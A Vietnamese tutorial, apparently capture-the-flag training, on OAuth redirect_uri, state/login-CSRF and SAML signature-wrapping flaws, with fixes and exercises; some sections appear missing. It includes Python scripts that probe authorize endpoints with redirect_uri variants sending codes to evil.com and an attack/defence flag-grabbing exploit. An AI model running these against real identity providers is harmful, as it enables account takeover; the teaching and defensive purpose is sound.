OAuth 2.0 & SAML — Lỗ hổng SSO

OAuth và SAML là 2 chuẩn phổ biến cho "Đăng nhập bằng Google/Facebook" hoặc SSO doanh nghiệp — nhiều bước request/redirect qua lại giữa 3 bên (user, app, nhà cung cấp danh tính). Mỗi bước chuyển giao này là 1 điểm có thể bị thiếu kiểm tra, dẫn tới chiếm quyền tài khoản người khác mà không cần mật khẩu.

00 / TÓM TẮT 1 PHÚT

3 lỗ hổng OAuth/SAML hay gặp nhất

(1) redirect_uri không validate chặt — OAuth cần 1 URL để nhà cung cấp gửi "mã xác thực" (authorization code) VỀ LẠI app; nếu app CHO PHÉP redirect_uri là domain TUỲ Ý (không chỉ đúng domain của chính app), kẻ tấn công lừa nạn nhân cấp quyền rồi code bị gửi VỀ DOMAIN CỦA KẺ TẤN CÔNG. (2) state không được kiểm tra (CSRF trong OAuth) — tham số state phải random và được app LƯU LẠI để so khớp, nếu không có/không kiểm tra, kẻ tấn công ép nạn nhân đăng nhập VÀO TÀI KHOẢN CỦA KẺ TẤN CÔNG mà không biết. (3) SAML Response không ký đúng cách / XML Signature Wrapping (XSW) — SAML dùng chữ ký số (digital signature) để xác thực response, nếu app kiểm tra chữ ký SAI VỊ TRÍ trong XML, kẻ tấn công chèn thêm 1 "Assertion" giả vào bên cạnh assertion thật đã ký, app đọc nhầm phần giả.

Nếu chỉ nhớ một điều Luôn kiểm tra 2 thứ đầu tiên khi gặp "Login with..." — redirect_uri (thử đổi domain) và state (thử bỏ hẳn tham số này) — đây là 2 lỗi phổ biến nhất, dễ test nhất, không cần hiểu sâu XML/crypto như SAML.

01 / NỀN TẢNG BẮT BUỘC

Những thứ cần hiểu trước

Authorization Code flow (OAuth 2.0) — luồng phổ biến nhất: user được redirect tới nhà cung cấp (provider) để đăng nhập/cấp quyền, provider redirect user VỀ LẠI app kèm 1 code ngắn hạn, app dùng code đó (ở phía SERVER, không public) đổi lấy access token thật.
redirect_uri — URL mà provider sẽ gửi code về. PHẢI khớp CHÍNH XÁC với domain app đã đăng ký trước với provider — nếu không, kẻ tấn công đổi URL này thành domain của mình để "hứng" code của nạn nhân.
state — giá trị ngẫu nhiên app tự sinh TRƯỚC khi redirect user tới provider, rồi SO KHỚP lại khi user quay về — chống CSRF cho chính luồng OAuth (không liên quan gì tới CSRF token thông thường của app, dù cùng nguyên lý).
SAML Assertion — phần "khẳng định" trong SAML Response, chứa thông tin user (username, email, quyền...) được KÝ SỐ bởi Identity Provider (IdP) để Service Provider (SP, chính là app) tin tưởng mà không cần hỏi lại IdP.
02 / VÌ SAO LỖ HỔNG TỒN TẠI

Nhiều bên, nhiều bước — mỗi bước đều có thể implement thiếu

OAuth/SAML có QUÁ NHIỀU bước redirect/callback qua lại giữa 3 bên độc lập (user, app, provider/IdP). Mỗi bước đều có 1 "giả định an toàn" riêng (redirect_uri đúng domain, state khớp, chữ ký XML đúng vị trí) — dev tích hợp OAuth/SAML CHỈ CẦN BỎ QUA 1 TRONG CÁC GIẢ ĐỊNH đó (thường vì thư viện mặc định không ép buộc, hoặc dev tự code tay 1 phần) là đủ để toàn bộ chuỗi tin tưởng bị phá vỡ.

import requests

def find_bypass(provider_authorize_url, client_id, legit_domain, variants):
    for v in variants:
        r = requests.get(provider_authorize_url, params={
            "client_id": client_id, "redirect_uri": v, "response_type": "code"
        }, allow_redirects=False, timeout=5)
        loc = r.headers.get("Location", "")
        if r.status_code in (301, 302, 303, 307) and "error" not in loc.lower():
            return v
    return None

VARIANTS = [
    "https://{legit}.evil.com/callback",
    "https://{legit}%2f@evil.com/callback",
]
print(find_bypass("https://provider.com/authorize", "X", "app.com",
    [v.format(legit="app.com") for v in VARIANTS]))

(C) Bản A/D tái dùng — biến thể đã xác nhận, dùng chung mọi đội

import re, requests

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")
WORKING_REDIRECT = "https://app.com.evil.com/callback"  # điền sau khi xác nhận trên service mẫu

def exploit_oauth(host):
    try:
        # Lừa nạn nhân (ở đây mô phỏng lại request của chính attacker để minh hoạ luồng)
        r = requests.get(f"https://{host}/authorize",
            params={"client_id": "X", "redirect_uri": WORKING_REDIRECT, "response_type": "code"},
            allow_redirects=True, timeout=5)
        m = FLAG_RE.search(r.text)
        return m.group() if m else None
    except requests.RequestException:
        return None

10 / PHÒNG THỦ: VIẾT WAF RULE

WAF hầu như không giúp được — fix phải ở code

Thành thật về giới hạnredirect_uri/state validation PHẢI đúng ở code app/provider — không có cách nào để WAF "chặn" 1 redirect_uri sai mà không hiểu logic nghiệp vụ của chính app. Tương tự, XSW (SAML) đòi hỏi parse và hiểu cấu trúc XML đúng ngữ nghĩa, vượt quá khả năng 1 WAF regex thông thường.

Fix đúng (ở code, không phải WAF):

  • redirect_uri: so khớp EXACT STRING MATCH với danh sách đã đăng ký trước, không dùng startswith/contains/regex lỏng.
  • state: BẮT BUỘC random, lưu server-side (session), so khớp đúng 1 lần dùng (one-time).
  • SAML: validate chữ ký trên ĐÚNG node Assertion sẽ được dùng để lấy thông tin user (không phải validate 1 node rồi đọc dữ liệu từ node khác).

13 / BÀI TẬP & THUẬT NGỮ

Luyện tập

⭐ Làm lại: dựng 1 OAuth provider giả đơn giản (Flask) với validate redirect_uri kiểu startswith (sai), tự tìm biến thể domain né được validate đó.

Gợi ý nếu kẹt"https://app.com.evil.com".startswith("https://app.com") trả về True trong Python — đây chính xác là lỗi cần tái tạo.

⭐⭐ Đổi 1 biến: thêm kiểm tra state vào app Flask giả trên, tự thử login CSRF (mục 00/03) để xác nhận bị chặn đúng cách khi có state.

Gợi ý nếu kẹtDùng secrets.token_urlsafe() sinh state, lưu vào session trước khi redirect, so khớp đúng session đó khi callback về.

⭐⭐⭐⭐ Tự nghĩ: giải thích vì sao lỗ hổng redirect_uri thường cần PHỐI HỢP với 1 lỗ hổng khác (XSS hoặc admin bot) mới thực sự "lấy được" account takeover, trong khi lỗ hổng thiếu state (login CSRF) có thể khai thác ĐƠN ĐỘC mà không cần lỗ hổng nào khác.

Gợi ý nếu kẹtredirect_uri bypass cần code BAY VỀ domain kẻ tấn công — kẻ tấn công phải có cách nào đó khiến NẠN NHÂN bấm link đó (1 kênh truyền link: XSS, admin bot, hoặc gửi trực tiếp); login CSRF ngược lại tự nó ĐÃ LÀ 1 link độc hoàn chỉnh, gửi trực tiếp cho nạn nhân bấm là đủ, không cần thêm lỗ hổng truyền tải nào khác.

Thuật ngữ
